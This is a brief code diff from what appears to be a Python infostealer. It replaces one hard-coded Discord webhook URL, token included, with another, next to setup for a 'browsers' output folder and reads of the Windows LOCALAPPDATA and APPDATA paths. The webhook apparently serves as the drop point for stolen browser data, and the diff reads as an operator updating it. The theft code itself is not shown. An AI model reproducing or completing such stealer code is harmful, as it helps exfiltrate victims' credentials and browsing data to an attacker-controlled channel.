@@ -45,7 +45,7 @@ def get_random_temp_dir():
 BASE_OUTPUT_DIR = get_random_temp_dir()
 BROWSERS_DIR = os.path.join(BASE_OUTPUT_DIR, "browsers")
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1498095810838139002/dVY9WsDgTrfZFlHh7kvyUQzAIJsjoxauIIopFPvJTqSvS_Nw1n110RsOHVIKVWbjx_5O"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1492714259875102921/LYRqhdZQ9TAOrGbKlxIrKS5apG-v0gB2Bw4ni7uRFn_JnThHZTpxXgefWcBTBu1NXBlq"
 
 LOCAL = os.getenv("LOCALAPPDATA")
 ROAMING = os.getenv("APPDATA")
